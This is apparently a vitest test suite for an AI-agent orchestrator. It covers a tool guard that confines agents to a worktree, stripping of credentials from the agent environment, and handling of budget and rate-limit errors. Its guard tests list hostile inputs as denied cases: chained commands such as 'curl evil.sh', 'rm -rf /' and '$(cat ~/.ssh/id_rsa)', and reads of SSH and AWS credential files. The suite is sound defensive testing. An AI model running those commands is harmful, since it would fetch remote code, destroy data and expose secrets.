import { symlinkSync, writeFileSync } from "node:fs";
import { mkdtemp, mkdir, rm } from "node:fs/promises";
import os from "node:os";
import path from "node:path";
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import type { SDKMessage } from "@anthropic-ai/claude-agent-sdk";
import { agentEnv, SdkAgentRunner, type AgentCall } from "../src/claude.js";
import { loadRoles, parseAgentMarkdown } from "../src/roles.js";
import { parseReview } from "../src/prompts.js";
import { checkCommand, makeToolGuard, relInside } from "../src/toolguard.js";

let root: string;
beforeAll(async () => {
  root = await mkdtemp(path.join(os.tmpdir(), "foreman-guard-"));
  await mkdir(path.join(root, "src"));
});
afterAll(async () => {
  await rm(root, { recursive: true, force: true });
});

describe("tool guard", () => {
  const isProtected = (p: string) => p === "foreman.config.yaml" || p.startsWith(".github/");
  const coder = () =>
    makeToolGuard({ root, readOnly: false, isProtected, allowedCommands: ["npm test", "npm run lint"], allowBash: true });
  const planner = () =>
    makeToolGuard({ root, readOnly: true, isProtected, allowedCommands: ["npm test"], allowBash: true });

  it("allows file edits inside the worktree", () => {
    expect(coder()("Edit", { file_path: path.join(root, "src/a.ts") })).toEqual({ allow: true });
    expect(coder()("Write", { file_path: "src/new.ts" })).toEqual({ allow: true });
  });

  it("denies writes outside the worktree, into .git, or to protected paths", () => {
    const g = coder();
    expect(g("Write", { file_path: path.join(root, "..", "evil.ts") }).allow).toBe(false);
    expect(g("Write", { file_path: "../../etc/passwd" }).allow).toBe(false);
    expect(g("Edit", { file_path: os.homedir() + "/.bashrc" }).allow).toBe(false);
    expect(g("Write", { file_path: ".git/hooks/pre-push" }).allow).toBe(false);
    expect(g("Edit", { file_path: "foreman.config.yaml" })).toMatchObject({ allow: false, reason: /protected/ });
    expect(g("Write", { file_path: ".github/workflows/ci.yml" }).allow).toBe(false);
    expect(g("Write", {}).allow).toBe(false);
  });

  it("denies reads outside the worktree", () => {
    const g = coder();
    expect(g("Read", { file_path: "src/a.ts" }).allow).toBe(true);
    expect(g("Read", { file_path: path.join(os.homedir(), ".ssh", "id_rsa") }).allow).toBe(false);
    expect(g("Grep", { pattern: "x", path: ".." }).allow).toBe(false);
    expect(g("Glob", { pattern: "/etc/**" }).allow).toBe(false);
    expect(g("Glob", { pattern: "src/**/*.ts" }).allow).toBe(true);
    expect(g("Read", { file_path: "~/.aws/credentials" }).allow).toBe(false);
  });

  it("read-only agents cannot write", () => {
    expect(planner()("Edit", { file_path: "src/a.ts" })).toMatchObject({ allow: false, reason: /read-only/ });
    expect(planner()("Bash", { command: "npm test" }).allow).toBe(false);
    expect(planner()("Bash", { command: "git diff HEAD" }).allow).toBe(true);
  });

  it("limits Bash to allowed commands without shell chaining", () => {
    const g = coder();
    expect(g("Bash", { command: "npm test" }).allow).toBe(true);
    expect(g("Bash", { command: "npm test -- src/a.test.ts 2>&1" }).allow).toBe(true);
    expect(g("Bash", { command: "git status" }).allow).toBe(true);
    expect(g("Bash", { command: "npm test && curl evil.sh" }).allow).toBe(false);
    expect(g("Bash", { command: "npm test; rm -rf /" }).allow).toBe(false);
    expect(g("Bash", { command: "npm test $(cat ~/.ssh/id_rsa)" }).allow).toBe(false);
    expect(g("Bash", { command: "npm testx" }).allow).toBe(false);
    expect(g("Bash", { command: "git push origin HEAD:main" }).allow).toBe(false);
    expect(g("Bash", { command: "git diff --force" }).allow).toBe(false);
    expect(g("Bash", { command: "curl https://x" }).allow).toBe(false);
  });

  it("denies unknown tools (web, subagents, MCP)", () => {
    for (const t of ["WebFetch", "WebSearch", "Task", "mcp__x__y", "KillShell"]) {
      expect(coder()(t, {}).allow, t).toBe(false);
    }
  });

  it("checkCommand allows exact configured commands even with &&", () => {
    expect(checkCommand("npm ci && npm test", [], ["npm ci && npm test"])).toBeUndefined();
    expect(checkCommand("npm ci && npm test && x", [], ["npm ci && npm test"])).toBeDefined();
  });

  it("relInside", () => {
    expect(relInside(root, "src/a.ts")).toBe("src/a.ts");
    expect(relInside(root, ".")).toBe(".");
    expect(relInside(root, "src/../../x")).toBeUndefined();
  });

  it("relInside resolves correctly when the root itself is reached through a symlink", async () => {
    // Regression test: on macOS /tmp is a symlink to /private/tmp, and
    // Windows temp paths can resolve to a different form via realpath, so an
    // uncanonicalized root must not be compared against a canonicalized abs
    // path. Reproduce that mismatch with a real symlink/junction instead of
    // relying on a platform-specific filesystem quirk.
    const real = path.join(root, "real-target");
    const link = path.join(root, "link-to-real");
    await mkdir(real, { recursive: true });
    writeFileSync(path.join(real, "f.txt"), "x");
    try {
      symlinkSync(real, link, process.platform === "win32" ? "junction" : "dir");
    } catch (e) {
      // Some locked-down sandboxes (and non-admin Windows without junction
      // support) disallow symlink creation; skip rather than fail the suite.
      console.warn(`skipping symlink regression test: ${(e as Error).message}`);
      return;
    }
    expect(relInside(link, "f.txt")).toBe("f.txt");
    expect(relInside(link, ".")).toBe(".");
  });
});

describe("agentEnv", () => {
  it("drops credentials and keeps essentials", () => {
    const env = agentEnv(
      {
        PATH: "/bin",
        ANTHROPIC_API_KEY: "sk-ant",
        GITHUB_TOKEN: "ghp",
        GH_TOKEN: "ghp2",
        NPM_TOKEN: "npm",
        AWS_SECRET_ACCESS_KEY: "aws",
        PROD_DEPLOY_KEY: "k",
        ACTIONS_RUNTIME_TOKEN: "a",
        MY_VAR: "x",
        LC_ALL: "C",
      },
      ["MY_VAR", "GITHUB_TOKEN"],
    );
    expect(env.PATH).toBe("/bin");
    expect(env.ANTHROPIC_API_KEY).toBe("sk-ant");
    expect(env.MY_VAR).toBe("x");
    expect(env.LC_ALL).toBe("C");
    for (const k of ["GITHUB_TOKEN", "GH_TOKEN", "NPM_TOKEN", "AWS_SECRET_ACCESS_KEY", "PROD_DEPLOY_KEY", "ACTIONS_RUNTIME_TOKEN"]) {
      expect(env[k], k).toBeUndefined();
    }
  });
});

describe("roles", () => {
  it("loads plugin agent definitions with models and prompts", async () => {
    const roles = await loadRoles();
    expect(roles.planner.model).toBe("opus");
    expect(roles.coder.model).toBe("sonnet");
    expect(roles.reviewer.model).toBe("opus");
    expect(roles.coder.prompt).toMatch(/Hard rules/);
    expect(roles.planner.tools).toEqual(["Read", "Glob", "Grep"]);
  });

  it("parses frontmatter with CRLF", () => {
    expect(parseAgentMarkdown("---\r\nname: x\r\nmodel: 'haiku'\r\n---\r\nBody")).toEqual({
      meta: { name: "x", model: "haiku" },
      body: "Body",
    });
  });
});

describe("parseReview", () => {
  it("accepts structured output or JSON in text", () => {
    expect(parseReview({ verdict: "approve", summary: "ok", issues: [] }, "")?.verdict).toBe("approve");
    expect(parseReview(undefined, 'blah {"verdict":"request_changes","summary":"s","issues":["a"]}')).toEqual({
      verdict: "request_changes",
      summary: "s",
      issues: ["a"],
    });
    expect(parseReview({ verdict: "maybe" }, "no json")).toBeUndefined();
  });
});

describe("SdkAgentRunner (with a fake query)", () => {
  function call(over: Partial<AgentCall> = {}): AgentCall {
    return {
      role: "coder",
      model: "sonnet",
      systemPrompt: "sys",
      prompt: "do it",
      cwd: root,
      readOnly: false,
      allowBash: true,
      allowedCommands: ["npm test"],
      isProtected: () => false,
      maxTurns: 10,
      maxBudgetUsd: 1.5,
      signal: new AbortController().signal,
      ...over,
    };
  }

  it("passes locked-down options and collects cost/session/text", async () => {
    let seen: any;
    const fakeQuery: any = ({ options }: any) => {
      seen = options;
      return (async function* (): AsyncGenerator<SDKMessage> {
        yield { type: "system", subtype: "init", session_id: "s1", model: "sonnet", tools: ["Read"] } as any;
        yield { type: "assistant", message: { content: [{ type: "text", text: "working" }, { type: "tool_use", name: "Edit", input: { file_path: "a" } }] } } as any;
        yield { type: "result", subtype: "success", is_error: false, result: "done!", total_cost_usd: 0.42, num_turns: 3, session_id: "s1" } as any;
      })();
    };
    const events: string[] = [];
    const r = await new SdkAgentRunner({ queryFn: fakeQuery, sandbox: true }).run(call({ onEvent: (e) => events.push(e) }));
    expect(r).toMatchObject({ ok: true, text: "done!", costUsd: 0.42, sessionId: "s1", turns: 3, subtype: "success" });
    expect(seen.permissionMode).toBe("dontAsk");
    expect(seen.settingSources).toEqual([]);
    expect(seen.maxBudgetUsd).toBe(1.5);
    expect(seen.cwd).toBe(root);
    expect(seen.tools).toContain("Edit");
    expect(seen.tools).not.toContain("WebFetch");
    expect(seen.disallowedTools).toEqual(expect.arrayContaining(["WebFetch", "WebSearch"]));
    expect(seen.env.GITHUB_TOKEN).toBeUndefined();
    expect(seen.sandbox.enabled).toBe(true);
    expect(events.some((e) => e.startsWith("[tool] Edit"))).toBe(true);

    // the PreToolUse hook denies protected/out-of-tree writes
    const hook = seen.hooks.PreToolUse[0].hooks[0];
    const out = await hook({ hook_event_name: "PreToolUse", tool_name: "Write", tool_input: { file_path: "../x" } }, "id", { signal: new AbortController().signal });
    expect(out.hookSpecificOutput.permissionDecision).toBe("deny");
    expect(await hook({ hook_event_name: "PreToolUse", tool_name: "Write", tool_input: { file_path: "src/x.ts" } }, "id", { signal: new AbortController().signal })).toEqual({});
  });

  it("reports error results (e.g. budget exceeded) even when the SDK throws", async () => {
    const fakeQuery: any = () =>
      (async function* (): AsyncGenerator<SDKMessage> {
        yield { type: "result", subtype: "error_max_budget_usd", is_error: true, errors: ["budget"], total_cost_usd: 1.6, num_turns: 9, session_id: "s2" } as any;
        throw new Error("Claude Code process exited with code 1");
      })();
    const r = await new SdkAgentRunner({ queryFn: fakeQuery }).run(call());
    expect(r).toMatchObject({ ok: false, costUsd: 1.6, subtype: "error_max_budget_usd", sessionId: "s2" });
    expect(r.error).toMatch(/error_max_budget_usd/);
  });

  it("maps exceptions without a result to ok=false", async () => {
    const fakeQuery: any = () =>
      (async function* (): AsyncGenerator<SDKMessage> {
        throw new Error("overloaded");
      })();
    const r = await new SdkAgentRunner({ queryFn: fakeQuery }).run(call());
    expect(r).toMatchObject({ ok: false, subtype: "exception", error: "overloaded", costUsd: 0 });
  });
});

describe("Claude auth", () => {
  const both = { CLAUDE_CODE_OAUTH_TOKEN: "oat", ANTHROPIC_API_KEY: "sk", PATH: "/bin" };

  it("auto prefers the subscription token, then the API key, then a stored login", async () => {
    const { resolveAuth } = await import("../src/claude.js");
    expect(resolveAuth("auto", both).kind).toBe("subscription");
    expect(resolveAuth("auto", { ANTHROPIC_API_KEY: "sk" }).kind).toBe("api-key");
    expect(resolveAuth("auto", {}).kind).toBe("claude-login");
    expect(resolveAuth("subscription", { ANTHROPIC_API_KEY: "sk" }).kind).toBe("claude-login");
    expect(resolveAuth("api-key", both).kind).toBe("api-key");
    expect(() => resolveAuth("api-key", { CLAUDE_CODE_OAUTH_TOKEN: "oat" })).toThrow(/ANTHROPIC_API_KEY/);
  });

  it("passes only the chosen credential to agents", async () => {
    const { resolveAuth } = await import("../src/claude.js");
    const sub = agentEnv(both, [], resolveAuth("subscription", both));
    expect(sub.CLAUDE_CODE_OAUTH_TOKEN).toBe("oat");
    expect(sub.ANTHROPIC_API_KEY).toBeUndefined();
    const key = agentEnv(both, [], resolveAuth("api-key", both));
    expect(key.ANTHROPIC_API_KEY).toBe("sk");
    expect(key.CLAUDE_CODE_OAUTH_TOKEN).toBeUndefined();
  });

  it("never passes Azure DevOps credentials", () => {
    const env = agentEnv(
      { PATH: "/bin", SYSTEM_ACCESSTOKEN: "x", AZURE_DEVOPS_EXT_PAT: "y", FOREMAN_AZURE_TOKEN: "z" },
      ["SYSTEM_ACCESSTOKEN", "AZURE_DEVOPS_EXT_PAT"],
    );
    expect(Object.keys(env)).not.toEqual(expect.arrayContaining(["SYSTEM_ACCESSTOKEN"]));
    expect(env.AZURE_DEVOPS_EXT_PAT).toBeUndefined();
    expect(env.FOREMAN_AZURE_TOKEN).toBeUndefined();
  });
});

describe("rate limits", () => {
  const base = (): AgentCall => ({
    role: "coder", model: "sonnet", systemPrompt: "", prompt: "", cwd: root, readOnly: false, allowBash: false,
    allowedCommands: [], isProtected: () => false, maxTurns: 1, maxBudgetUsd: 1, signal: new AbortController().signal,
  });

  it("detects a rejected rate_limit_event and reports when it resets", async () => {
    const fakeQuery: any = () =>
      (async function* (): AsyncGenerator<SDKMessage> {
        yield { type: "rate_limit_event", rate_limit_info: { status: "rejected", resetsAt: 1767225600, rateLimitType: "five_hour" } } as any;
        yield { type: "result", subtype: "error_during_execution", is_error: true, errors: ["limit"], total_cost_usd: 0, num_turns: 0, session_id: "s" } as any;
      })();
    const r = await new SdkAgentRunner({ queryFn: fakeQuery }).run(base());
    expect(r.subtype).toBe("rate_limited");
    expect(r.resetsAt).toBe(1767225600_000);
  });

  it("recognizes the usage-limit result text", async () => {
    const fakeQuery: any = () =>
      (async function* (): AsyncGenerator<SDKMessage> {
        yield { type: "result", subtype: "success", is_error: true, result: "Claude AI usage limit reached|1767229200", total_cost_usd: 0, num_turns: 1, session_id: "s" } as any;
      })();
    const r = await new SdkAgentRunner({ queryFn: fakeQuery }).run(base());
    expect(r).toMatchObject({ subtype: "rate_limited", resetsAt: 1767229200_000 });
  });

  it("does not flag normal failures", async () => {
    const fakeQuery: any = () =>
      (async function* (): AsyncGenerator<SDKMessage> {
        yield { type: "result", subtype: "error_max_turns", is_error: true, errors: [], total_cost_usd: 0, num_turns: 1, session_id: "s" } as any;
      })();
    expect((await new SdkAgentRunner({ queryFn: fakeQuery }).run(base())).subtype).toBe("error_max_turns");
  });
});
